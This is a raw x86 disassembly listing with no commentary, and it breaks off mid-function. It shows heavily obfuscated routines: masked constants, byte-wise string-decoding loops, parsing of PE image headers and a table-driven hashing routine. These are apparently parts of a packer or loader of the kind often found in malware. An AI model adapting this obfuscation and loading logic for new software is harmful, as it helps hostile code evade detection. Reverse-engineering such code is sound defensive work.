  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
